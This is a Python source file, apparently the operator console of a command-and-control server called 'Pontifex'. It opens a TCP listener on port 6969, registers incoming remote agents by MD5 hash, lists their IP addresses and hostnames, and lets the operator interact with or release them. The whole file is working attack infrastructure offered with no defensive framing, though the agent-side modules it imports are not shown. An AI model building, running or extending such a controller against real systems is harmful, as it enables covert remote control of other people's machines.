# -*- coding: utf-8 -*-

###############################################################
##   pontifex.py                                             ##
##   The Pontifex                                            ##
##   Created by Bob Yuan on 2020-11-03.                      ##
##   Copyright © 2020 Kryptosr. All rights reserved.         ##
###############################################################

import socket
import sys, os, threading, time
from hashlib import md5
import json
from prompt_toolkit.history import FileHistory
from prompt_toolkit import prompt
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from lib.helper import *
from lib.debug import Debug
from lib.c2 import C2
from lib.dmos import Dmos
from termcolor import colored, cprint

class Pontifex():
    def __init__(self):
        self.ANODE = "0.0.0.0"
        self.APORT = 6969
        self.dmoss = {}
        self.c2 = C2(self.ANODE, self.APORT, self)
        self.isConnected = False

    def cmdline(self):
        while 1:
            cmd = input(colored("[Pontifex] → ", 'cyan', attrs=['bold']))
            command = cmd.split(' ')[0]
            args = cmd[len(command)+1:]

            if command == "exit":
                Debug.eprint(f"C2 on tcp://{self.ANODE}:{self.APORT} shutting down...")
                clean(self.c2.s)
                os._exit(1)
            elif command == "clear":
                os.system("clear")
            elif command == "free":
                self.dmoss[args].conn.send("free".encode())
                terminate(self.dmoss[args].conn, self.dmoss, self.dmoss[args], "gracefully")
            elif command == "list":
                #print(self.dmoss)
                #print("BORN  HASH\tIP (global)\tHOSTNAME")
                for d, hash in enumerate(self.dmoss):
                    print("{}\t{}\t{}\t\t{}".format(self.dmoss[hash].born, hash, self.dmoss[hash].GLOBAL, self.dmoss[hash].HOSTNAME))
            elif command == "i":
                try:
                    self.dmoss[args].interact()
                except KeyError:
                    Debug.eprint("Invalid MD5_hash")
            elif command == "r":
                clean(self.c2.s)
                python = sys.executable
                os.execl(python, python, *sys.argv)

    def listener_daemon(self):
        while 1:
            dmos = self.c2.accept_conn()
            for d in self.dmoss.keys():
                if d == dmos.md5_hash:
                    self.isConnected = True
                    dmos.conn.send("free".encode())
            if self.isConnected != True:
                Debug.sprint(f"Connection from {dmos.md5_hash} ({dmos.GLOBAL})", ANODE=self.ANODE, APORT=self.APORT, thread=True)
                #dmos.multi_handler = self
                self.dmoss[dmos.md5_hash] = dmos

    @safe_exec
    def start_listener_daemon(self):
        LISTENER = threading.Thread(target=self.listener_daemon)
        LISTENER.daemon = True
        try:
            LISTENER.start()
            Debug.tprint(f"TCP server <tcp://{self.ANODE}:{self.APORT}> is online")
        except Exception as e:
            Debug.eprint(f"Unable to start daemon listener, Error: {e}")

    @safe_exec
    def start_c2(self):
        self.c2.listener()

    @safe_exec
    def start_keepAlive(self):
        KEEPALIVE = threading.Thread(target=self.c2.keepAlive)
        KEEPALIVE.start()

if __name__ == "__main__":
    os.system("clear")
    banner()
    p = Pontifex()
    p.start_c2()
    p.start_listener_daemon()
    p.start_keepAlive()
    p.cmdline()
